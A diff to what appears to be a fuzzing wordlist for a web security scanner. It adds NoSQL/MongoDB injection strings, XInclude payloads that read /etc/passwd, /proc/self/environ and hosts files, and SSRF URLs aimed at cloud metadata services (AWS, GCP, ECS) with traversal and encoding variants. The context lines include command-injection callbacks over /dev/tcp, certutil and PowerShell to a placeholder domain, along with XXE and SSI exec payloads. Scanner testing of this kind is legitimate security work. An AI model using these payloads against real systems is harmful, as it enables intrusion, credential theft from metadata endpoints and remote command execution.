@@ -313,6 +313,26 @@ NULL
 NOT_NULL
 LE
 GE
+true, $where: '1 == 1'
+, $where: '1 == 1'
+$where: '1 == 1'
+', $where: '1 == 1'
+1, $where: '1 == 1'
+{ $ne: 1 }
+', $or: [ {}, { 'a':'a
+' } ], $comment:'successful MongoDB injection'
+db.injection.insert({success:1});
+db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
+|| 1==1
+' && this.password.match(\/.*\/)\/\/+%00
+' && this.passwordzz.match(\/.*\/)\/\/+%00
+'%20%26%26%20this.password.match(\/.*\/)\/\/+%00
+'%20%26%26%20this.passwordzz.match(\/.*\/)\/\/+%00
+{$gt: ''}
+[$ne]=1
+';return 'a'=='a' && ''=='
+\";return(true);var xyz='a
+0;return true
 $(\/bin\/bash -c true > \/dev\/tcp\/{domain}\/80)
 $(\/bin\/sh -c true > \/dev\/tcp\/{domain}\/80)
 $(certutil -urlcache -f 'http:\/\/{domain}')
@@ -839,6 +859,22 @@ ${\"freemarker.template.utility.Execute\"?new()(\"powershell -c Invoke-WebReques
 %3C%21DOCTYPE%20example%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22http%3A%2F%2F{domain}%22%3E%5D%3E%3Croot%3E%26xxe%3B%3C%2Froot%3E
 <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:\/\/\/etc\/passwd\" >]><foo>&xxe;<\/foo>
 <?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:\/\/\/proc\/self\/environ\" >]><foo>&xxe;<\/foo>
+<hjk xmlns:xi=\"http:\/\/www.w3.org\/2001\/XInclude\"><xi:include href=\"file:\/\/\/etc\/passwd\" parse=\"text\"\/><\/hjk>
+%3Chjk%20xmlns%3Axi%3D%22http%3A%2F%2Fwww%2Ew3%2Eorg%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20href%3D%22file%3A%2F%2F%2Fetc%2Fpasswd%22%20parse%3D%22text%22%2F%3E%3C%2Fhjk%3E
+<hjk xmlns:xi=\"http:\/\/www.w3.org\/2001\/XInclude\"><xi:include href=\"file:\/\/\/proc\/self\/environ\" parse=\"text\"\/><\/hjk>
+%3Chjk%20xmlns%3Axi%3D%22http%3A%2F%2Fwww%2Ew3%2Eorg%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20href%3D%22file%3A%2F%2F%2Fproc%2Fself%2Fenviron%22%20parse%3D%22text%22%2F%3E%3C%2Fhjk%3E
+<hjk xmlns:xi=\"http:\/\/www.w3.org\/2001\/XInclude\"><xi:include href=\"file:\/\/\/etc\/hosts\" parse=\"text\"\/><\/hjk>
+%3Chjk%20xmlns%3Axi%3D%22http%3A%2F%2Fwww%2Ew3%2Eorg%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20href%3D%22file%3A%2F%2F%2Fetc%2Fhosts%22%20parse%3D%22text%22%2F%3E%3C%2Fhjk%3E
+<hjk xmlns:xi=\"http:\/\/www.w3.org\/2001\/XInclude\"><xi:include href=\"file:\/\/\/etc\/hostname\" parse=\"text\"\/><\/hjk>
+%3Chjk%20xmlns%3Axi%3D%22http%3A%2F%2Fwww%2Ew3%2Eorg%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20href%3D%22file%3A%2F%2F%2Fetc%2Fhostname%22%20parse%3D%22text%22%2F%3E%3C%2Fhjk%3E
+<hjk xmlns:xi=\"http:\/\/www.w3.org\/2001\/XInclude\"><xi:include href=\"file:\/\/\/windows\/system32\/drivers\/etc\/hosts\" parse=\"text\"\/><\/hjk>
+%3Chjk%20xmlns%3Axi%3D%22http%3A%2F%2Fwww%2Ew3%2Eorg%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20href%3D%22file%3A%2F%2F%2Fwindows%2Fsystem32%2Fdrivers%2Fetc%2Fhosts%22%20parse%3D%22text%22%2F%3E%3C%2Fhjk%3E
+<hjk xmlns:xi=\"http:\/\/www.w3.org\/2001\/XInclude\"><xi:include href=\"http:\/\/{domain}\" parse=\"text\"\/><\/hjk>
+%3Chjk%20xmlns%3Axi%3D%22http%3A%2F%2Fwww%2Ew3%2Eorg%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20href%3D%22http%3A%2F%2F{domain}%22%20parse%3D%22text%22%2F%3E%3C%2Fhjk%3E
+<hjk xmlns:xi=\"http:\/\/www.w3.org\/2001\/XInclude\"><xi:include href=\"http:\/\/169.254.169.254\" parse=\"text\"\/><\/hjk>
+%3Chjk%20xmlns%3Axi%3D%22http%3A%2F%2Fwww%2Ew3%2Eorg%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20href%3D%22http%3A%2F%2F169%2E254%2E169%2E254%22%20parse%3D%22text%22%2F%3E%3C%2Fhjk%3E
+<hjk xmlns:xi=\"http:\/\/www.w3.org\/2001\/XInclude\"><xi:include href=\"http:\/\/metadata.google.internal\/computeMetadata\/v1\" parse=\"text\"\/><\/hjk>
+%3Chjk%20xmlns%3Axi%3D%22http%3A%2F%2Fwww%2Ew3%2Eorg%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude%20href%3D%22http%3A%2F%2Fmetadata%2Egoogle%2Einternal%2FcomputeMetadata%2Fv1%22%20parse%3D%22text%22%2F%3E%3C%2Fhjk%3E
 <!--#exec cmd=\"\/bin\/bash -c true > \/dev\/tcp\/{domain}\/80\" -->
 <!--#exec cmd=\"\/bin\/ls \/\" -->
 <!--#exec cmd=\"\/bin\/sh -c true > \/dev\/tcp\/{domain}\/80\" -->
@@ -1039,6 +1075,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1
 http:\/\/metadata.google.internal\/computeMetadata\/v1\/
 \/\/metadata.google.internal\/computeMetadata\/v1
 \\\\metadata.google.internal\\computeMetadata\\v1
+http:\/\/169.254.170.2\/v4\/metadata
+http:\/\/169.254.170.2\/v4\/metadata\/
+\/\/169.254.170.2\/v4\/metadata\/
+\\\\169.254.170.2\\v4\\metadata\\
 \/etc\/passwd%00
 ..\/etc\/passwd%00
 ..\/..\/etc\/passwd%00
@@ -1139,6 +1179,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1%00
 http:\/\/metadata.google.internal\/computeMetadata\/v1\/%00
 \/\/metadata.google.internal\/computeMetadata\/v1%00
 \\\\metadata.google.internal\\computeMetadata\\v1%00
+http:\/\/169.254.170.2\/v4\/metadata%00
+http:\/\/169.254.170.2\/v4\/metadata\/%00
+\/\/169.254.170.2\/v4\/metadata\/%00
+\\\\169.254.170.2\\v4\\metadata\\%00
 \/etc\/passwd\/*
 ..\/..\/..\/..\/..\/..\/etc\/hosts\/*
 ..\\..\\..\\..\\..\\..\\etc\\hosts\/*
@@ -1191,6 +1235,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1*
 http:\/\/metadata.google.internal\/computeMetadata\/v1\/*
 \/\/metadata.google.internal\/computeMetadata\/v1*
 \\\\metadata.google.internal\\computeMetadata\\v1*
+http:\/\/169.254.170.2\/v4\/metadata*
+http:\/\/169.254.170.2\/v4\/metadata\/*
+\/\/169.254.170.2\/v4\/metadata\/*
+\\\\169.254.170.2\\v4\\metadata\\*
 \/etc\/passwd\/%2f\/
 ..\/..\/..\/..\/..\/..\/etc\/hosts\/%2f\/
 ..\\..\\..\\..\\..\\..\\etc\\hosts\/%2f\/
@@ -1243,6 +1291,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1\/%2f\/
 http:\/\/metadata.google.internal\/computeMetadata\/v1\/\/%2f\/
 \/\/metadata.google.internal\/computeMetadata\/v1\/%2f\/
 \\\\metadata.google.internal\\computeMetadata\\v1\/%2f\/
+http:\/\/169.254.170.2\/v4\/metadata\/%2F\/
+http:\/\/169.254.170.2\/v4\/metadata\/\/%2F\/
+\/\/169.254.170.2\/v4\/metadata\/%2F\/
+\\\\169.254.170.2\\v4\\metadata\\%2F\\
 \/etc\/passwd\/.\/
 ..\/..\/..\/..\/..\/..\/etc\/hosts\/.\/
 ..\\..\\..\\..\\..\\..\\etc\\hosts\/.\/
@@ -1295,6 +1347,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1\/.\/
 http:\/\/metadata.google.internal\/computeMetadata\/v1\/\/.\/
 \/\/metadata.google.internal\/computeMetadata\/v1\/.\/
 \\\\metadata.google.internal\\computeMetadata\\v1\/.\/
+http:\/\/169.254.170.2\/v4\/metadata.\/
+http:\/\/169.254.170.2\/v4\/metadata\/.\/
+\/\/169.254.170.2\/v4\/metadata\/.\/
+\\\\169.254.170.2\\v4\\metadata\\.\\
 \/etc\/passwd\/*\/
 ..\/..\/..\/..\/..\/..\/etc\/hosts\/*\/
 ..\\..\\..\\..\\..\\..\\etc\\hosts\/*\/
@@ -1347,6 +1403,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1\/*\/
 http:\/\/metadata.google.internal\/computeMetadata\/v1\/\/*\/
 \/\/metadata.google.internal\/computeMetadata\/v1\/*\/
 \\\\metadata.google.internal\\computeMetadata\\v1\/*\/
+http:\/\/169.254.170.2\/v4\/metadata*\/
+http:\/\/169.254.170.2\/v4\/metadata\/*\/
+\/\/169.254.170.2\/v4\/metadata\/*\/
+\\\\169.254.170.2\\v4\\metadata\\*\\
 \/etc\/passwd\/..;\/
 ..\/..\/..\/..\/..\/..\/etc\/hosts\/..;\/
 ..\\..\\..\\..\\..\\..\\etc\\hosts\/..;\/
@@ -1399,6 +1459,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1\/..;\/
 http:\/\/metadata.google.internal\/computeMetadata\/v1\/\/..;\/
 \/\/metadata.google.internal\/computeMetadata\/v1\/..;\/
 \\\\metadata.google.internal\\computeMetadata\\v1\/..;\/
+http:\/\/169.254.170.2\/v4\/metadata..;\/
+http:\/\/169.254.170.2\/v4\/metadata\/..;\/
+\/\/169.254.170.2\/v4\/metadata\/..;\/
+\\\\169.254.170.2\\v4\\metadata\\..;\\
 \/etc\/passwd\/..%3B\/
 ..\/..\/..\/..\/..\/..\/etc\/hosts\/..%3B\/
 ..\\..\\..\\..\\..\\..\\etc\\hosts\/..%3B\/
@@ -1452,6 +1516,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1\/..%3B\/
 http:\/\/metadata.google.internal\/computeMetadata\/v1\/\/..%3B\/
 \/\/metadata.google.internal\/computeMetadata\/v1\/..%3B\/
 \\\\metadata.google.internal\\computeMetadata\\v1\/..%3B\/
+http:\/\/169.254.170.2\/v4\/metadata..%3B\/
+http:\/\/169.254.170.2\/v4\/metadata\/..%3B\/
+\/\/169.254.170.2\/v4\/metadata\/..%3B\/
+\\\\169.254.170.2\\v4\\metadata\\..%3B\\
 %2e\/etc\/passwd\/
 %2e\/..\/..\/..\/..\/..\/..\/etc\/hosts\/
 %2e\\..\\..\\..\\..\\..\\..\\etc\\hosts\/
@@ -1505,6 +1573,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1\/\/..%3B\/
 %2e\/http:\/\/metadata.google.internal\/computeMetadata\/v1\/
 %2e\/\/\/metadata.google.internal\/computeMetadata\/v1
 %2e\\\\\\metadata.google.internal\\computeMetadata\\v1
+%2e\/http:\/\/169.254.170.2\/v4\/metadata
+%2e\/http:\/\/169.254.170.2\/v4\/metadata\/
+%2e\/\/\/169.254.170.2\/v4\/metadata\/
+%2e\\\\\\169.254.170.2\\v4\\metadata\\
 \/\/etc\/passwd\/
 \/\/..\/..\/..\/..\/..\/..\/etc\/hosts\/
 \\\\..\\..\\..\\..\\..\\..\\etc\\hosts\/
@@ -1558,6 +1630,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1\/\/..%3B\/
 \/\/http:\/\/metadata.google.internal\/computeMetadata\/v1\/
 \/\/\/\/metadata.google.internal\/computeMetadata\/v1
 \\\\\\\\metadata.google.internal\\computeMetadata\\v1
+\/\/http:\/\/169.254.170.2\/v4\/metadata
+\/\/http:\/\/169.254.170.2\/v4\/metadata\/
+\/\/\/\/169.254.170.2\/v4\/metadata\/
+\\\\\\\\169.254.170.2\\v4\\metadata\\
 \/;\/etc\/passwd\/
 \/;\/..\/..\/..\/..\/..\/..\/etc\/hosts\/
 \\;\\..\\..\\..\\..\\..\\..\\etc\\hosts\/
@@ -1611,6 +1687,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1\/\/..%3B\/
 \/;\/http:\/\/metadata.google.internal\/computeMetadata\/v1\/
 \/;\/\/\/metadata.google.internal\/computeMetadata\/v1
 \\;\\\\\\metadata.google.internal\\computeMetadata\\v1
+\/;\/http:\/\/169.254.170.2\/v4\/metadata
+\/;\/http:\/\/169.254.170.2\/v4\/metadata\/
+\/;\/\/\/169.254.170.2\/v4\/metadata\/
+\\;\\\\\\169.254.170.2\\v4\\metadata\\
 \/.;\/etc\/passwd\/
 \/.;\/..\/..\/..\/..\/..\/..\/etc\/hosts\/
 \\.;\\..\\..\\..\\..\\..\\..\\etc\\hosts\/
@@ -1664,6 +1744,10 @@ http:\/\/metadata.google.internal\/computeMetadata\/v1\/\/..%3B\/
 \/.;\/http:\/\/metadata.google.internal\/computeMetadata\/v1\/
 \/.;\/\/\/metadata.google.internal\/computeMetadata\/v1
 \\.;\\\\\\metadata.google.internal\\computeMetadata\\v1
+\/.;\/http:\/\/169.254.170.2\/v4\/metadata
+\/.;\/http:\/\/169.254.170.2\/v4\/metadata\/
+\/.;\/\/\/169.254.170.2\/v4\/metadata\/
+\\.;\\\\\\169.254.170.2\\v4\\metadata\\
 %E2%A0%80%0A%E2%A0%80
 undefined
 undef
@@ -1692,4 +1776,4 @@ hasOwnProperty
 <foo val=\u201Cbar\u201D \/>
 <foo val=\u201Cbar\u201D \/>
 <foo val=\u201Dbar\u201C \/>
-<foo val=`bar' \/
+<foo val=`bar' \/>
